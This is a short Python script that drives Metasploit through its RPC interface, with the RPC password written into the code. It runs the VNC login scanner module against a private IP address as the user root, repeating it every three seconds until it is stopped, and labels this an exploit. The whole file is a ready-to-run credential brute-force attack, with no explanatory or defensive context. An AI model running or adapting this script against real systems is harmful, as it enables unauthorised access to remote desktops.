from pymetasploit3.msfrpc import MsfRpcClient
import time

if __name__ == "__main__":
    TARGET_IP = "192.168.21.3"

    client = MsfRpcClient("home5450", port=55552, ssl=True)

    exploit = client.modules.use("auxiliary", "scanner/vnc/vnc_login")
    exploit["RHOSTS"] = TARGET_IP
    exploit["THREADS"] = 10
    exploit["USERNAME"] = "root"

    print("Ctrl + C to stop exploit")
    while True:
        try:
            exploit.execute()
            print(f"VNC login exploit on {TARGET_IP}")
        except Exception as e:
            print(f"Error performing exploit: {e}")
        finally:
            time.sleep(3)
